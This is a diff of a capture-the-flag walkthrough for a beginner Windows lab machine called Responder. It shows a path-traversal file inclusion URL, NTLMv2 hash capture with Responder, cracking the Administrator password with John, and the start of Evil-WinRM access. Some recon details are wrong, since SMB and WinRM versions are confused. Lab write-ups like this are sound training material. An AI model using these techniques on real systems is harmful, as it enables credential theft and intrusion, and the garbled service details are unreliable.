@@ -1,11 +1,12 @@
+# Responder
+#startingpoint 
 #veryeasy 
 #web 
 #windows
 #hash
 #winrm
 #php
-
-**Reconnaissance**
+### Reconnaissance
 We start by running an Nmap scan against the target IP address, to do this we use `nmap -p- -sV $TARGET`. The output shows that there are several open ports, including HTTP (port 80), SMB (port 445), and MS-RPC (port 500). The Nmap scan also provides information about the services running on each port. For example, we found that the HTTP server is running version 2.4.52 of the Microsoft HTTP API, while the SMB server is running version 2.0 of the Windows Remote Management protocol. This suggested that the system was using outdated software, which could make it more vulnerable to attacks.
 ```
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-21 10:10 CET
@@ -18,16 +19,14 @@ PORT     STATE SERVICE    VERSION
 7680/tcp open  pando-pub?
 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 ```
-
-
-**Exploring the website**
+### Exploring the website
 If we access the website from the web-browser using the IP we get redirected to `http://unika.htb/` but the browser says that it is unable to find the web, so we know its using name-based Virtual Hosting.
 
 We add the domain to /etc/hosts with `echo "${TARGET} unika.htb" | sudo tee -a /etc/hosts`
 Once done we can now see properly the website, we notice we can change the language, if we try to change it to German for example, we see that the url changes to this `http://unika.htb/index.php?page=german.html`
 We can potentially exploit this to do a File Inclusion Vulnerability.
 
-**File Inclusion Vulnerability**
+### File Inclusion Vulnerability
 Now we can test if we are able to access files from the web-server that we aren't supposed to, such as for example the windows hosts file. In order to do this we can search the following URL `http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts`
 
 The website show us the content of the hosts file and it looks like this:
@@ -35,7 +34,7 @@ The website show us the content of the hosts file and it looks like this:
 # Copyright (c) 1993-2009 Microsoft Corp. # # This is a sample HOSTS file used by Microsoft TCP/IP for Windows. # # This file contains the mappings of IP addresses to host names. Each # entry should be kept on an individual line. The IP address should # be placed in the first column followed by the corresponding host name. # The IP address and the host name should be separated by at least one # space. # # Additionally, comments (such as these) may be inserted on individual # lines or following the machine name denoted by a '#' symbol. # # For example: # # 102.54.94.97 rhino.acme.com # source server # 38.25.63.10 x.acme.com # x client host # localhost name resolution is handled within DNS itself. # 127.0.0.1 localhost # ::1 localhost
 ```
 
-**Responder**
+### Responder
 
 We know that we have a Windows machine which is allowing us to get any kind of file that we need.
 As the machine name says we are going to use the responder utility.
@@ -120,7 +119,7 @@ If we check the responder we see the following:
 [SMB] NTLMv2-SSP Username : RESPONDER\Administrator
 [SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:81338c8e0e67cf8a:2F143B092C220F10E72C3A98D614AB72:010100000000000000040A93661CDA016F79F715D622A0AC000000000200080048004D005700350001001E00570049004E002D00470053004800320054005900550044005A0058005A0004003400570049004E002D00470053004800320054005900550044005A0058005A002E0048004D00570035002E004C004F00430041004C000300140048004D00570035002E004C004F00430041004C000500140048004D00570035002E004C004F00430041004C000700080000040A93661CDA0106000400020000000800300030000000000000000100000000200000CB0FFB75F5B03EFDB855416B745D7C62CB697DF950EBD376E1C224D73E1DA4190A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100360039000000000000000000
 ```
-**Breaking the hash**
+### Breaking the hash
 
 The hash can be broken by using a tool like John the ripper, to start we save the hash as a file.
 ```
@@ -142,7 +141,7 @@ Session completed
 John found that the Administrator account password is badminton. Now that we have it we can access the winrm service we found earlier.
 
 
-**Windows Remote Management**
+### Windows Remote Management
 
 We can use Evil-WinRM to connect to the target system and execute commands as the Administrator user. 
 
